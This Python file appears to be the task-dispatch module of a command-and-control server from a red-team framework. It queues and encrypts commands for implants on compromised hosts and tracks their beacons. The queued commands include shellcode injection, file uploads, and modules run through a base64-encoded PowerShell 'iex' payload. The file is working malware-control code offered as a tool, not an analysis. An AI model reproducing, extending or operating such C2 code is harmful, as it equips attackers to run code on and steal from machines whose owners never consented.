from Colours import Colours
from Core import load_module, load_module_sharp, encrypt, default_response
import DB, datetime, hashlib, re, base64, traceback


def newTask(path):
    result = DB.get_implants_all()
    commands = ""
    if result:
        for i in result:
            RandomURI = i[1]
            EncKey = i[5]
            tasks = DB.get_newtasks(RandomURI)
            if RandomURI in path and tasks:
                for a in tasks:
                    command = a[2]
                    user = a[3]
                    user_command = command
                    hostinfo = DB.get_hostinfo(RandomURI)
                    now = datetime.datetime.now()
                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")):
                        user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                        command = command[:command.index("#")]
                    elif (command.lower().startswith('upload-file')):
                        filepath = command.replace('upload-file', '')
                        if ";" in filepath:
                            # This is a SharpHandler
                            filepath = filepath.split(";")[1].strip()
                        elif ":" in filepath:
                            # This is a PyHandler
                            filepath = filepath.split(":")[0].strip()
                        elif "estination" in filepath:
                            # This is a PSHandler
                            filepath = filepath.split('"')[1].strip()
                        else:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % filepath)
                            print(Colours.GREEN)                        
                        try:
                            # For PSHandler, grab the base64 string (following the -Base64 parameter)
                            source = re.search("(?<=-Base64 )\\S*", str(command))
                            filehash = hashlib.md5(base64.b64decode(source[0])).hexdigest()
                        except:
                            # If not PSHandler, use the filepath variable which is set above with the B64 string. (Also pads if there is an invalid length)
                            filehash = hashlib.md5(base64.b64decode(filepath + '=' * (-len(filepath) % 4))).hexdigest()                        
                        user_command = "Uploading file: %s with md5sum: %s" % (filepath, filehash)
                    taskId = DB.insert_task(RandomURI, user_command, user)
                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
                    if len(str(taskId)) > 5:
                        raise ValueError('Task ID is greater than 5 characters which is not supported.')
                    print(Colours.YELLOW)
                    if user is not None and user != "":
                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
                    else:
                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
                    try:
                        print(user_command)
                        print(Colours.END)
                    except Exception as e:
                        print("Cannot print output: %s" % e)
                    if a[2].startswith("loadmodule"):
                        try:
                            module_name = (a[2]).replace("loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                    if a[2].startswith("pbind-loadmodule"):
                        try:
                            module_name = (a[2]).replace("pbind-loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "pbind-command \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    command = taskIdStr + command
                    if commands:
                        commands += "!d-3dion@LD!-d" + command
                    else:
                        commands += command
                    DB.del_newtasks(str(a[0]))
                if commands is not None:
                    multicmd = "multicmd%s" % commands
                try:
                    responseVal = encrypt(EncKey, multicmd)
                except Exception as e:
                    responseVal = ""
                    print("Error encrypting value: %s" % e)
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return responseVal
            elif RandomURI in path and not tasks:
                # if there is no tasks but its a normal beacon send 200
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return default_response()
